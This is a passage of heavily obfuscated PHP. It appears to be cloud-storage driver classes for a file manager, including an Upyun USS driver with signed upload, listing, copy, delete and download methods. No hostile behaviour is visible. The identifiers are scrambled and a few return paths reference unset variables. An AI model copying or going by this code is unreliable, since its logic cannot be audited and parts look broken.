$«‚åü³ë[12], $«‚åü³ë[240] => $«‚åü³ë[120], $«‚åü³ë[284] => $–Üª€ğ[$«‚åü³ë[76]]); $Èç—ùÏ = $«‚åü³ë[253]; $òÑôĞİØ = $«‚åü³ë[8] . $this->pathEncode($¤Şåç¬á) . $¤³ô¤Ì; $ò·ã´®‘ = $this->client->__getSignatureV4($íŸ“¾®·, $Ï¢‹¥ÈÆ, $Èç—ùÏ, $òÑôĞİØ); if (strpos($¤³ô¤Ì, $«‚åü³ë[252]) === 0) { if (isset($íŸ“¾®·[$«‚åü³ë[1449]])) { $ùŒ‚ù‰· = $íŸ“¾®·[$«‚åü³ë[1449]]; } else { if (isset($ò·ã´®‘[$«‚åü³ë[1449]])) { $ùŒ‚ù‰· = $ò·ã´®‘[$«‚åü³ë[1449]]; } else { $ùŒ‚ù‰· = hash($«‚åü³ë[282], $«‚åü³ë[12]); } } return array($«‚åü³ë[258] => $ò·ã´®‘[$«‚åü³ë[258]], $«‚åü³ë[1449] => $ùŒ‚ù‰·, $«‚åü³ë[249] => $ò·ã´®‘[$«‚åü³ë[1452]]); } return $ò·ã´®‘[$«‚åü³ë[258]]; } public function listUploadParts($×†Î«ê‘, $ûÛœ’‘» = array()) { $Àö÷¬¿ñ =& $_SERVER[–Ú¬çÁ]; $°ëüÆ÷ = str_replace($Àö÷¬¿ñ[259], $Àö÷¬¿ñ[12], $ûÛœ’‘»[$Àö÷¬¿ñ[175]]); $ı„å°—Û = $this->client->listParts($this->bucket, $×†Î«ê‘, $°ëüÆ÷); if (!$ı„å°—Û) { return !1; } $íøû‰„® = $Àö÷¬¿ñ[1453]; foreach ($ı„å°—Û as $²•û˜¿ó) { $íøû‰„® .= $Àö÷¬¿ñ[1454] . "\74\x50\141\x72\164\x4e\165\x6d\142\x65\x72\x3e{$²•û˜¿ó[$Àö÷¬¿ñ[1409]]}\74\x2f\x50\141\x72\x74\x4e\165\x6d\x62\x65\162\x3e\xa" . "\74\105\x54\141\x67\76{$²•û˜¿ó[$Àö÷¬¿ñ[1410]]}\x3c\57\x45\124\x61\x67\x3e\12" . $Àö÷¬¿ñ[1455]; } $íøû‰„® .= $Àö÷¬¿ñ[1456]; $‰º©Õ¼„ = array(); $¤ìÆ¼ùù = explode($Àö÷¬¿ñ[198], $this->getHost()); $×‰ˆ”É = array($Àö÷¬¿ñ[1450] => $¤ìÆ¼ùù[1], $Àö÷¬¿ñ[240] => $Àö÷¬¿ñ[120], $Àö÷¬¿ñ[284] => strlen($íøû‰„®)); $µ¯ßçÔ = $Àö÷¬¿ñ[251]; $›åÆ„é = $Àö÷¬¿ñ[8] . $this->pathEncode($×†Î«ê‘) . $ûÛœ’‘»[$Àö÷¬¿ñ[175]]; $ğğÁíæı = $this->client->__getSignatureV4($‰º©Õ¼„, $×‰ˆ”É, $µ¯ßçÔ, $›åÆ„é, $íøû‰„®); return array($Àö÷¬¿ñ[258] => $ğğÁíæı[$Àö÷¬¿ñ[258]], $Àö÷¬¿ñ[249] => $ğğÁíæı[$Àö÷¬¿ñ[1452]], $Àö÷¬¿ñ[260] => $ı„å°—Û, $Àö÷¬¿ñ[1449] => $ğğÁíæı[$Àö÷¬¿ñ[1449]]); } public function link($•ë—à¸, $¦ÄÆÅüœ = array()) { return parent::link($•ë—à¸, $¦ÄÆÅüœ); } public function fileOut($ïòÎè—Š, $¤„¸ïé = false, $œúõüÈ = false, $Êİ æ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[–Ú¬çÁ][1457])) { return parent::fileOutServer($ïòÎè—Š, $¤„¸ïé, $œúõüÈ, $Êİ æ); } parent::fileOut($ïòÎè—Š, $¤„¸ïé, $œúõüÈ, $Êİ æ); } public function fileOutImage($Öëï¨µÕ, $ºØõø»» = 250) { if (strstr($this->endpoint, $_SERVER[–Ú¬çÁ][1457])) { return parent::fileOutImageServer($Öëï¨µÕ, $ºØõø»»); } parent::fileOutImage($Öëï¨µÕ, $ºØõø»»); } public function fileOutLink($œœªûÄœ) { $™Şí“ê² =& $_SERVER[–Ú¬çÁ]; if (substr($œœªûÄœ, 0, 7) == $™Şí“ê²[1350]) { $œœªûÄœ = $™Şí“ê²[1351] . substr($œœªûÄœ, 7); } header($™Şí“ê²[162] . $œœªûÄœ); die; } public function getHost() { $ª´¨±Óæ =& $_SERVER[–Ú¬çÁ]; $°óµ§ë = str_rtrim(parent::getHost(), $ª´¨±Óæ[8] . $this->bucket); $°óµ§ë = explode($ª´¨±Óæ[198], $°óµ§ë); return $°óµ§ë[0] . $ª´¨±Óæ[198] . $this->bucket . $ª´¨±Óæ[10] . $°óµ§ë[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($õ²ùÖØ—, $¸×İĞÖú = 0) { parent::__construct(); $this->source = $õ²ùÖØ—; $this->sourceSize = $¸×İĞÖú; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($î·œÃç = false) { return $this->sourceSize; } public function getContent($©´£ßÕğ = false) { return $this->fileSubstr($©´£ßÕğ, 0, $this->sourceSize); } public function fileSubstr($•¼¹©İ¼ = false, $Ä¶ùìÕ¢ = 0, $ˆ³ì‡õ™ = 0) { if (!$ˆ³ì‡õ™) { $ˆ³ì‡õ™ = $this->sourceSize; } $Áî–îãç = $this->sourceSize - $Ä¶ùìÕ¢; if ($ˆ³ì‡õ™ >= $Áî–îãç) { $ˆ³ì‡õ™ = $Áî–îãç; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ä¶ùìÕ¢, $ˆ³ì‡õ™); } if ($this->sourceType == self::TYPE_FILE) { if ($ˆ³ì‡õ™ <= 0) { return $_SERVER[–Ú¬çÁ][12]; } $ª”ç¨î = ftell($this->source); fseek_64($this->source, $ª”ç¨î + $Ä¶ùìÕ¢); $ãâº…âö = @fread($this->source, $ˆ³ì‡õ™); fseek_64($this->source, $ª”ç¨î); return $ãâº…âö; } } public function hashMd5($ £„µÆ² = false) { return md5($this->getContent()); } public static function hash($ç‘Õ²¯ú, $¼éëå²ù = 0) { $¼ãüÈ¤ª = new PathDriverStream($ç‘Õ²¯ú, $¼éëå²ù); return $¼ãüÈ¤ª->hashSimple($ç‘Õ²¯ú); } public static function md5($°æÏÆª­, $½‹ÌÃäİ = 0) { $Ë¦¿ÔèØ = new PathDriverStream($°æÏÆª­, $½‹ÌÃäİ); return $Ë¦¿ÔèØ->hashMd5($°æÏÆª­); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\72\x2f\57\x76\60\56\x61\x70\x69\56\x75\x70\x79\165\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($‘ÙÄÚ°Í) { parent::__construct(); $this->_init($‘ÙÄÚ°Í); } public function _init($ÁÌ§¼”¢) { $ƒ‘›•ŒŞ =& $_SERVER[–Ú¬çÁ]; foreach ($ÁÌ§¼”¢ as $ÂØœÕƒÃ => $‚€…ªšÒ) { if (isset($this->{$ÂØœÕƒÃ})) { $this->{$ÂØœÕƒÃ} = $‚€…ªšÒ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ƒ‘›•ŒŞ[1458] . LNG($ƒ‘›•ŒŞ[1389])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÈøŠ…£¹, $òşãæ‹ = "\x47\x45\124") { $¾‹á¶Æİ =& $_SERVER[–Ú¬çÁ]; $±ÓüµÆ = gmdate($¾‹á¶Æİ[1422]); $”¶™§„÷ = base64_encode(hash_hmac($¾‹á¶Æİ[1459], "{$òşãæ‹}\x26{$ÈøŠ…£¹}\x26{$±ÓüµÆ}", md5("{$this->userpass}"), !0)); $ü²¦˜ƒ¼ = array("\x41\165\164\x68\x6f\x72\151\172\141\164\151\x6f\x6e\72\125\x50\131\x55\x4e\40{$this->username}\72{$”¶™§„÷}", "\x44\x61\164\x65\x3a{$±ÓüµÆ}"); return $ü²¦˜ƒ¼; } public function ussRequest($¦‚õØ¥¨, $Ù™»ı·£ = "\x47\x45\124", $ÖóŠÜÁÚ = false, $óÁ­¹‡ª = false, $ƒÅÔó•Ñ = false) { $×ü¥‘²ø =& $_SERVER[–Ú¬çÁ]; $¦‚õØ¥¨ = trim($¦‚õØ¥¨, $×ü¥‘²ø[8]); $üöûƒÖ = "\x2f{$this->bucket}\57{$¦‚õØ¥¨}"; $•¤êìÛş = $this->ussHeaders($üöûƒÖ, $Ù™»ı·£); if ($óÁ­¹‡ª) { $•¤êìÛş = array_merge($•¤êìÛş, $óÁ­¹‡ª); } $ÒàÁ¡”ö = url_request($this->endpoint . $üöûƒÖ, $Ù™»ı·£, $ÖóŠÜÁÚ, $•¤êìÛş, $ƒÅÔó•Ñ); if (!$ÒàÁ¡”ö) { return array($×ü¥‘²ø[1232] => !1, $×ü¥‘²ø[1222] => $×ü¥‘²ø[1460]); } if (strtolower($Ù™»ı·£) == $×ü¥‘²ø[221] || in_array($ÒàÁ¡”ö[$×ü¥‘²ø[1232]], array($×ü¥‘²ø[266], $×ü¥‘²ø[1461]))) { $ÖóŠÜÁÚ = $ÒàÁ¡”ö[$×ü¥‘²ø[1462]]; } else { $ÖóŠÜÁÚ = json_decode($ÒàÁ¡”ö[$×ü¥‘²ø[1222]], !0); if (!$ÖóŠÜÁÚ) { $ÖóŠÜÁÚ = $ÒàÁ¡”ö[$×ü¥‘²ø[1222]]; } else { if (!$ÒàÁ¡”ö[$×ü¥‘²ø[770]] && isset($ÖóŠÜÁÚ[$×ü¥‘²ø[1463]])) { $ÖóŠÜÁÚ = $ÖóŠÜÁÚ[$×ü¥‘²ø[1463]]; } } } return array($×ü¥‘²ø[1232] => $ÒàÁ¡”ö[$×ü¥‘²ø[770]], $×ü¥‘²ø[1222] => $ÖóŠÜÁÚ); } public function mkfile($ı’ëÁ¿Å, $‘ùààôÓ = '', $½×ÑˆÚ = REPEAT_RENAME) { if ($this->setContent($ı’ëÁ¿Å, $‘ùààôÓ)) { return $this->getPathOuter($ı’ëÁ¿Å); } return !1; } public function mkdir($«£×í™’, $Á÷ÀšÄ = REPEAT_SKIP) { $ÔÉ‘” =& $_SERVER[–Ú¬çÁ]; $›Õµ¶ = trim($«£×í™’, $ÔÉ‘”[8]); if ($this->_isFolder($›Õµ¶)) { return $this->getPathOuter($›Õµ¶); } $ñ’…‰Î = array($ÔÉ‘”[1464]); $†Œ¿Ï›ä = $this->ussRequest($›Õµ¶, $ÔÉ‘”[251], !1, $ñ’…‰Î); return $†Œ¿Ï›ä[$ÔÉ‘”[1232]] ? $this->getPathOuter($›Õµ¶) : !1; } public function copyFile($£’Ï³ÕŞ, $¾Ò³€²Ğ) { $éºğĞİ =& $_SERVER[–Ú¬çÁ]; $£éãşµ = array($éºğĞİ[1465] . "\x2f{$this->bucket}\x2f{$£’Ï³ÕŞ}", $éºğĞİ[1466]); $•ËÜ°¤Õ = $this->ussRequest($¾Ò³€²Ğ, $éºğĞİ[253], !1, $£éãşµ); return $•ËÜ°¤Õ[$éºğĞİ[1232]] ? !0 : $this->getPathOuter($¾Ò³€²Ğ); } public function moveFile($½½Îüèû, $õ€¯ıøŞ) { $’«Õúß =& $_SERVER[–Ú¬çÁ]; $ğÕ®ŸÃ¡ = array($’«Õúß[1467] . "\x2f{$this->bucket}\57{$½½Îüèû}", $’«Õúß[1466]); $ÀÎœàÔö = $this->ussRequest($õ€¯ıøŞ, $’«Õúß[253], !1, $ğÕ®ŸÃ¡); return $ÀÎœàÔö[$’«Õúß[1232]] ? !0 : $this->getPathOuter($õ€¯ıøŞ); } public function delFile($úğüùÜ‹) { $°Ë¶ß¬† =& $_SERVER[–Ú¬çÁ]; $Åªùù¡Ï = $this->ussRequest($úğüùÜ‹, $°Ë¶ß¬†[1468]); return $Åªùù¡Ï[$°Ë¶ß¬†[1232]] ? !0 : !1; } public function delFolder($”ŠÄ´–Ô) { $¾å¿‚Ù =& $_SERVER[–Ú¬çÁ]; if (!$this->exist($”ŠÄ´–Ô)) { return !0; } $this->listItemCache = !1; $˜º‡í»ğ = $–ÈÌÑæå = array(); $this->fileList($”ŠÄ´–Ô, $˜º‡í»ğ, $–ÈÌÑæå, !0); $this->listItemCache = !0; foreach ($–ÈÌÑæå as $¸³ˆ¾Ä) { $İù„úÕ› = $this->ussRequest($¸³ˆ¾Ä[$¾å¿‚Ù[32]], $¾å¿‚Ù[1468]); if (!$İù„úÕ›[$¾å¿‚Ù[1232]]) { return !1; } } foreach ($˜º‡í»ğ as $à¹²¼È) { $İù„úÕ› = $this->ussRequest($à¹²¼È, $¾å¿‚Ù[1468]); if (!$İù„úÕ›[$¾å¿‚Ù[1232]]) { return !1; } } $İù„úÕ› = $this->ussRequest($”ŠÄ´–Ô, $¾å¿‚Ù[1468]); return $İù„úÕ›[$¾å¿‚Ù[1232]]; } public function rename($‹Áùßëê, $Ã‘´°±ƒ) { if ($this->isFile($‹Áùßëê)) { $Ã‘´°±ƒ = get_path_father($‹Áùßëê) . $Ã‘´°±ƒ; return $this->moveFile($‹Áùßëê, $Ã‘´°±ƒ); } return $this->renameObject($‹Áùßëê, $Ã‘´°±ƒ); } public function fileInfo($ª±áÉ—Ò, $Î²œ¼±¨ = false, $„š½Áà× = array()) { $ŒãßÉ‹ =& $_SERVER[–Ú¬çÁ]; $Å¼ÙşÂ = array($ŒãßÉ‹[32] => $this->pathThis($ª±áÉ—Ò), $ŒãßÉ‹[84] => $this->getPathOuter($ŒãßÉ‹[8] . $ª±áÉ—Ò), $ŒãßÉ‹[33] => $ŒãßÉ‹[224], $ŒãßÉ‹[76] => isset($„š½Áà×[$ŒãßÉ‹[76]]) ? $„š½Áà×[$ŒãßÉ‹[76]] : 0, $ŒãßÉ‹[175] => $this->ext($ª±áÉ—Ò)); if ($Î²œ¼±¨) { return $Å¼ÙşÂ; } $Å¼ÙşÂ[$ŒãßÉ‹[225]] = $Å¼ÙşÂ[$ŒãßÉ‹[85]] = 0; $Å¼ÙşÂ[$ŒãßÉ‹[226]] = $Å¼ÙşÂ[$ŒãßÉ‹[227]] = !0; if (empty($„š½Áà×)) { $„š½Áà× = $this->objectMeta($ª±áÉ—Ò); if (!$„š½Áà×) { return $Å¼ÙşÂ; } } $Å¼ÙşÂ[$ŒãßÉ‹[225]] = intval($„š½Áà×[$ŒãßÉ‹[1469]]); $Å¼ÙşÂ[$ŒãßÉ‹[85]] = intval($„š½Áà×[$ŒãßÉ‹[1470]]); $Å¼ÙşÂ[$ŒãßÉ‹[76]] = $„š½Áà×[$ŒãßÉ‹[76]]; return $Å¼ÙşÂ; } public function folderInfo($ƒı’ÃæÒ, $€â›‘ä = false) { $¬ÊøÑñ =& $_SERVER[–Ú¬çÁ]; $“ÃŸàËî = array($¬ÊøÑñ[32] => $this->pathThis($ƒı’ÃæÒ), $¬ÊøÑñ[84] => $this->getPathOuter($¬ÊøÑñ[8] . $ƒı’ÃæÒ), $¬ÊøÑñ[33] => $¬ÊøÑñ[75]); if ($€â›‘ä) { return $“ÃŸàËî; } $“ÃŸàËî[$¬ÊøÑñ[225]] = $“ÃŸàËî[$¬ÊøÑñ[85]] = 0; $“ÃŸàËî[$¬ÊøÑñ[226]] = $“ÃŸàËî[$¬ÊøÑñ[227]] = !0; if (empty($»€ÈÅ³•)) { $»€ÈÅ³• = $this->objectMeta($ƒı’ÃæÒ); if (!$»€ÈÅ³•) { return $“ÃŸàËî; } } $“ÃŸàËî[$¬ÊøÑñ[225]] = intval($»€ÈÅ³•[$¬ÊøÑñ[1469]]); $“ÃŸàËî[$¬ÊøÑñ[85]] = intval($»€ÈÅ³•[$¬ÊøÑñ[1470]]); return $“ÃŸàËî; } private function listObjs($Ñí…î°», $Øû­ºÉ = 0, $¢«‰Õë = 1000) { $³¿Îñş =& $_SERVER[–Ú¬çÁ]; $ïÑ²Ö“ = array($³¿Îñş[1471], $³¿Îñş[1472] . $¢«‰Õë); if ($Øû­ºÉ) { $ïÑ²Ö“[] = $³¿Îñş[1473] . $Øû­ºÉ; } $Â·Ö™È‘ = $this->ussRequest($Ñí…î°», $³¿Îñş[255], !1, $ïÑ²Ö“); return !$Â·Ö™È‘[$³¿Îñş[1232]] ? !1 : $Â·Ö™È‘[$³¿Îñş[1222]]; } private function fileList($Üæ¯ Î, &$ ¢ƒéì¹, &$íÂ•Ë, $çƒÊ»ôø = false) { $ëİùäää =& $_SERVER[–Ú¬çÁ]; $øàé¯² = $ëİùäää[12]; $†®»ø¢½ = 1000; $í°È’ß = rtrim($Üæ¯ Î, $ëİùäää[8]) . $ëİùäää[8]; while (!0) { check_abort(); $œÇ¨‰é€ = $this->listObjs($Üæ¯ Î, $øàé¯², $†®»ø¢½); if (!$œÇ¨‰é€) { return !1; } $øàé¯² = isset($œÇ¨‰é€[$ëİùäää[1474]]) ? $œÇ¨‰é€[$ëİùäää[1474]] : $ëİùäää[12]; $ÜÙ€º™¥ = isset($œÇ¨‰é€[$ëİùäää[1475]]) ? $œÇ¨‰é€[$ëİùäää[1475]] : array(); foreach ($ÜÙ€º™¥ as $Â¼æ…í) { $õ§öù¶… = $Â¼æ…í[$ëİùäää[33]] == $ëİùäää[75] ? !0 : !1; $ªÂ»÷Ñ’ = ltrim($í°È’ß . $Â¼æ…í[$ëİùäää[32]], $ëİùäää[8]) . ($õ§öù¶… ? $ëİùäää[8] : $ëİùäää[12]); $„ƒã‹åÌ = array($ëİùäää[32] => $ªÂ»÷Ñ’, $ëİùäää[33] => $õ§öù¶… ? $ëİùäää[75] : $ëİùäää[224], $ëİùäää[76] => $Â¼æ…í[$ëİùäää[390]], $ëİùäää[1470] => $Â¼æ…í[$ëİùäää[1476]]); $this->cacheMethodInfoSet($ªÂ»÷Ñ’, $õ§öù¶…, $„ƒã‹åÌ); if ($õ§öù¶…) { $ ¢ƒéì¹[] = $ªÂ»÷Ñ’; if ($çƒÊ»ôø) { $this->fileList($ªÂ»÷Ñ’, $ ¢ƒéì¹, $íÂ•Ë, $çƒÊ»ôø); } continue; } $íÂ•Ë[] = $„ƒã‹åÌ; } if (count($ÜÙ€º™¥) < $†®»ø¢½) { break; } } $this->cacheMethodInfoSet($Üæ¯ Î, !0); } public function listPath($É´ìãõö, $´Š‹û‡Ğ = false) { $®Ñ™ø× =& $_SERVER[–Ú¬çÁ]; $æØ˜üé» = $Ü¥ıåÉ¹ = array(); $this->fileList($É´ìãõö, $æØ˜üé», $Ü¥ıåÉ¹); foreach ($æØ˜üé» as $éÛ—ÔÕê => $´İ£¢ Õ) { $æØ˜üé»[$éÛ—ÔÕê] = $this->folderInfo($´İ£¢ Õ, $´Š‹û‡Ğ); } foreach ($Ü¥ıåÉ¹ as $éÛ—ÔÕê => $´İ£¢ Õ) { $Ü¥ıåÉ¹[$éÛ—ÔÕê] = $this->fileInfo($´İ£¢ Õ[$®Ñ™ø×[32]], $´Š‹û‡Ğ, $´İ£¢ Õ); } return array($®Ñ™ø×[82] => $æØ˜üé», $®Ñ™ø×[83] => $Ü¥ıåÉ¹); } public function has($„ñÍ’ŸË, $·ı­¨© = false, $Ÿ­Å¶¨ğ = true) { $¥£œ Ë™ =& $_SERVER[–Ú¬çÁ]; $¶½™•ã¹ = $¥£œ Ë™[12]; $ûïŞ™®ò = 500; $©İÂİğƒ = 0; $éù×ñÃô = 0; $’Ì÷¡©ß = rtrim($„ñÍ’ŸË, $¥£œ Ë™[8]) . $¥£œ Ë™[8]; while (!0) { check_abort(); $ØçÜÏáˆ = $this->listObjs($„ñÍ’ŸË, $¶½™•ã¹, $ûïŞ™®ò); if (!$ØçÜÏáˆ) { return !1; } $¶½™•ã¹ = isset($ØçÜÏáˆ[$¥£œ Ë™[1474]]) ? $ØçÜÏáˆ[$¥£œ Ë™[1474]] : $¥£œ Ë™[12]; $‰˜«¡ã = isset($ØçÜÏáˆ[$¥£œ Ë™[1475]]) ? $ØçÜÏáˆ[$¥£œ Ë™[1475]] : array(); if (empty($‰˜«¡ã)) { break; } $Íáü—š = array_filter($‰˜«¡ã, function ($ë´ù«æç) { $î§ØÏÜ¥ =& $_SERVER[–Ú¬çÁ]; return $ë´ù«æç[$î§ØÏÜ¥[33]] == $î§ØÏÜ¥[75]; }); $ÍèÍ­·¾ = count($‰˜«¡ã); $Íáü—š = count($Íáü—š); $„‘Ñ«ÂË = $ÍèÍ­·¾ - $Íáü—š; if ($·ı­¨©) { $éù×ñÃô += $Íáü—š; $©İÂİğƒ += $„‘Ñ«ÂË; if ($ÍèÍ­·¾ < $ûïŞ™®ò) { break; } continue; } if ($Ÿ­Å¶¨ğ) { if ($„‘Ñ«ÂË) { return !0; } } else { if ($Íáü—š) { return !0; } } if ($ÍèÍ­·¾ < $ûïŞ™®ò) { break; } } if ($·ı­¨©) { return array($¥£œ Ë™[233] => $©İÂİğƒ, $¥£œ Ë™[234] => $éù×ñÃô); } return !1; } public function listAll($ÜÄ¨Ú÷ñ) { $é®«ØŒì =& $_SERVER[–Ú¬çÁ]; $¿¤€®±ç = $ğ–éñÉì = array(); $this->fileList($ÜÄ¨Ú÷ñ, $¿¤€®±ç, $ğ–éñÉì, !0); $ä©ÃÅ¤á = array_to_keyvalue($ğ–éñÉì, $é®«ØŒì[32]); foreach ($¿¤€®±ç as $¦Æ²ı) { if (is_string($¦Æ²ı)) { $ä©ÃÅ¤á[$¦Æ²ı] = array($é®«ØŒì[76] => 0); } } return $this->listAllFiles($ÜÄ¨Ú÷ñ, $ä©ÃÅ¤á); } public function canRead($­èûšÙÌ) { return $this->exist($­èûšÙÌ) ? !0 : !1; } public function canWrite($Óàò×â) { return $this->exist($Óàò×â) ? !0 : !1; } public function getContent($š–³Ğ¥¯) { return $this->fileSubstr($š–³Ğ¥¯, 0, -1); } public function setContent($¶óı‡½Ş, $ï–Êµğ = '') { $ ¨––ÛÉ =& $_SERVER[–Ú¬çÁ]; if (!$ï–Êµğ) { $„‰îïƒá = $this->ussRequest($¶óı‡½Ş, $ ¨––ÛÉ[251]); return $„‰îïƒá[$ ¨––ÛÉ[1232]]; } $¦»´àúñ = $this->tempFile($this->pathThis($¶óı‡½Ş)); file_put_contents($¦»´àúñ, $ï–Êµğ); if ($this->upload($¶óı‡½Ş, $¦»´àúñ)) { $this->tempFileRemve($¦»´àúñ); return !0; } return !1; } public function fileSubstr($Ø×¢Æ­é, $¼ê€Ğõ‰, $°¸ò¿¯ë) { $ Šğïë =& $_SERVER[–Ú¬çÁ]; if (!($½»ªµ”£ = $this->link($Ø×¢Æ­é))) { return !1; } $Æïåœœ– = !1; if ($°¸ò¿¯ë > 0) { $¦„§¨³ = $¼ê€Ğõ‰ + $°¸ò¿¯ë - 1; $Æïåœœ– = array($ Šğïë[1437] . $¼ê€Ğõ‰ . $ Šğïë[439] . $¦„§¨³); } $ÃÚô›ë¸ = url_request($½»ªµ”£, $ Šğïë[255], !1, $Æïåœœ–); return $ÃÚô›ë¸[$ Šğïë[770]] ? $ÃÚô›ë¸[$ Šğïë[1222]] : !1; } public function upload($û½»†„, $È…¶ˆÓ£, $¾Œ½É®ê = false, $Ìº‘´  = REPEAT_REPLACE) { $¨‰Ä÷­ =& $_SERVER[–Ú¬çÁ]; $ ú¥éÆ = IO::size($È…¶ˆÓ£); if ($ ú¥éÆ <= 1024 * 1024 * 200) { $›ßµİ‰‘ = array($¨‰Ä÷­[1477] . $È…¶ˆÓ£); $€µ®“ºš = $this->ussRequest($û½»†„, $¨‰Ä÷­[253], $›ßµİ‰‘); return $€µ®“ºš[$¨‰Ä÷­[1232]] ? $this->getPathOuter($û½»†„) : !1; } $Öäñ÷ãî = 1024 * 1024 * 10; $ôªÄÚ•Ö = array($¨‰Ä÷­[1478], $¨‰Ä÷­[1479] . $ ú¥éÆ, $¨‰Ä÷­[1480], $¨‰Ä÷­[1481] . $Öäñ÷ãî); $€µ®“ºš = $this->ussRequest($û½»†„, $¨‰Ä÷­[253], !1, $ôªÄÚ•Ö); if (!$€µ®“ºš[$¨‰Ä÷­[1232]]) { return !1; } $ğåŒ²Ù… = $€µ®“ºš[$¨‰Ä÷­[1222]]; $«†ò«€Â = 0; $˜‡¹»®ø = $ğåŒ²Ù…[$¨‰Ä÷­[1482]]; $¢Å»Ò™• = fopen($È…¶ˆÓ£, $¨‰Ä÷­[1386]); if (!$¢Å»Ò™•) { return !1; } do { $øçºí‰ = $ğåŒ²Ù…[$¨‰Ä÷­[1483]]; fseek_64($¢Å»Ò™•, $«†ò«€Â); $ğğº®¡— = fread($¢Å»Ò™•, $øçºí‰); $Õüş†Üø = 0; do { $Õüş†Üø++; $ğåŒ²Ù… = $this->uploadPart($û½»†„, $ğåŒ²Ù…, $ğğº®¡—); } while (!$ğåŒ²Ù… && $Õüş†Üø < 3); if (!$ğåŒ²Ù…) { return !1; } $˜‡¹»®ø = $ğåŒ²Ù…[$¨‰Ä÷­[1482]]; $«†ò«€Â += $øçºí‰; } while ($˜‡¹»®ø != -1); fclose($¢Å»Ò™•); $ôªÄÚ•Ö = array($¨‰Ä÷­[1484], $¨‰Ä÷­[1485] . $ğåŒ²Ù…[$¨‰Ä÷­[1486]], $¨‰Ä÷­[1480]); $€µ®“ºš = $this->ussRequest($û½»†„, $¨‰Ä÷­[253], !1, $ôªÄÚ•Ö); return $€µ®“ºš[$¨‰Ä÷­[1232]] ? $this->getPathOuter($ùüÔË×¸) : !1; } private function uploadPart($ƒë¡°«, $©Óµõ³, &$•ö®ü™µ) { $Ç²ãŒ¾ =& $_SERVER[–Ú¬çÁ]; $ïÆ«Èõš = array($Ç²ãŒ¾[1487], $Ç²ãŒ¾[1485] . $©Óµõ³[$Ç²ãŒ¾[1486]], $Ç²ãŒ¾[1488] . $©Óµõ³[$Ç²ãŒ¾[1482]], $Ç²ãŒ¾[143] . $©Óµõ³[$Ç²ãŒ¾[1483]]); $ÎØÂè¡ = $this->ussRequest($ƒë¡°«, $Ç²ãŒ¾[253], $•ö®ü™µ, $ïÆ«Èõš); return !$ÎØÂè¡[$Ç²ãŒ¾[1232]] ? $ÎØÂè¡[$Ç²ãŒ¾[1232]] : $ÎØÂè¡[$Ç²ãŒ¾[1222]]; } public function uploadFormData($‚º´Ÿª­, $ÙûÏÅ·… = 3600) { return $this->uploadPolicy($‚º´Ÿª­, $ÙûÏÅ·…); } public function multiUploadFormData($‡×ÚŠìó, $æñ‡±Ö³ = 3600) { $©õ°ÕŠÂ =& $_SERVER[–Ú¬çÁ]; $§ı½ñàâ = (int) $GLOBALS[$©õ°ÕŠÂ[7]][$©õ°ÕŠÂ[76]]; return $this->uploadPolicy($‡×ÚŠìó, $æñ‡±Ö³, $§ı½ñàâ); } private function uploadPolicy($âÊè¯ˆ, $ñ”¯ûÃØ = 3600, $ÀÑÅæıü = 0) { $Àïà =& $_SERVER[–Ú¬çÁ]; $ÂÈàšË‰ = $Àïà[8] . $this->bucket; $ÚÂíŸÆö = gmdate($Àïà[1422]); $İ“É‡Ê¤ = array($Àïà[1489] => $this->bucket, $Àïà[1490] => $âÊè¯ˆ, $Àïà[1491] => time() + $ñ”¯ûÃØ, $Àïà[1492] => $ÚÂíŸÆö); if ($ÀÑÅæıü) { $İ“É‡Ê¤[$Àïà[1403]] = $ÀÑÅæıü; } $Îİ¢”¢ = base64_encode(json_encode($İ“É‡Ê¤)); $±Ö”è = base64_encode(hash_hmac($Àïà[1459], "\120\x4f\x53\124\46{$ÂÈàšË‰}\46{$ÚÂíŸÆö}\46{$Îİ¢”¢}", md5("{$this->userpass}"), !0)); $°À¥Ú† = array($Àïà[285] => $Îİ¢”¢, $Àïà[1493] => "\125\x50\131\125\x4e\x20{$this->username}\x3a{$±Ö”è}", $Àïà[196] => $this->endpoint . $ÂÈàšË‰); return $°À¥Ú†; } public function download($¢ÇÇ­šÚ, $ÃÏä¾ê‹) { $µÚîÓı = IO::getPathInner(IO::mkfile($ÃÏä¾ê‹)); if (!($ÖæÚŒ¼Ú = $this->link($¢ÇÇ­šÚ))) { return !1; } $ØŒÈ–‹Š = 0; $•ÓøêÃİ = 1024 * 200; $¦³Æ÷¡Ò = fopen($µÚîÓı, $_SERVER[–Ú¬çÁ][1443]); while (!0) { $ĞŒŠş¡Ï = $this->fileSubstr($¢ÇÇ­šÚ, $ØŒÈ–‹Š, $•ÓøêÃİ); if ($ĞŒŠş¡Ï === !1) { return !1; } fwrite($¦³Æ÷¡Ò, $ĞŒŠş¡Ï); $ØŒÈ–‹Š += $•ÓøêÃİ; if (strlen($ĞŒŠş¡Ï) < $•ÓøêÃİ) { break; } } fclose($¦³Æ÷¡Ò); return $ÃÏä¾ê‹; } public function link($¶Ù“ã²â, $³ÖŸÛĞ¢ = array()) { $¾•×¡Á =& $_SERVER[–Ú¬çÁ]; $¶Ù“ã²â = trim($¶Ù“ã²â, $¾•×¡Á[8]); if (!empty($this->token)) { $áĞ÷ç»œ = strtotime(date($¾•×¡Á[1494])); $Ë™“Á¾ = substr(md5($this->token . $¾•×¡Á[337] . $áĞ÷ç»œ . $¾•×¡Á[1495] . $¶Ù“ã²â), 12, 8) . $áĞ÷ç»œ; $³ÖŸÛĞ¢[] = $¾•×¡Á[1496] . $Ë™“Á¾; } $÷±™Ú±„ = !empty($³ÖŸÛĞ¢) ? $¾•×¡Á[73] . implode($¾•×¡Á[337], $³ÖŸÛĞ¢) : $¾•×¡Á[12]; return $this->getHost() . $¾•×¡Á[8] . $¶Ù“ã²â . $÷±™Ú±„; } public function fileOut($ëğöŸâË, $ä¨Şúì² = false, $Íğ“²ÛÓ 